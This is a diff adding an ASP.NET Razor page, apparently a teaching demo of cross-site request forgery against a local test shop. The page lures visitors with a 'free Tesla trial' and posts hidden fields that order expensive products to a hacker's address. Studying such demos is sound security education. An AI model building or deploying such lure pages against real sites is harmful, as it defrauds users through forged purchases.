@@ -1,0 +1,20 @@
+﻿@{
+    ViewData["Title"] = "Home Page";
+}
+
+<h1>Prueba gratuita del Tesla Model 3</h1>
+
+<form method="post" action="https://localhost:7273/Tienda/Productos">
+    <img src="https://tesla-cdn.thron.com/delivery/public/image/tesla/195458a0-ff67-488c-b972-14d23d2c42fb/bvlatuR/std/1200x630/ms-homepage-social" width="400" />
+
+    <input type="hidden" name="direccion" value="casa del hacker, pringao" class="form-control" />
+
+    <button type="submit" class="my-2 btn btn-success">
+        Pedir prueba gratuita
+    </button>
+
+    <input type="hidden" name="producto" value="Tesla 80000€" />
+    <input type="hidden" name="producto" value="IPhone 21 8000€" />
+    <input type="hidden" name="producto" value="Ferrari 250000€" />
+    <input type="hidden" name="producto" value="Portatil 1200€" />
+</form>
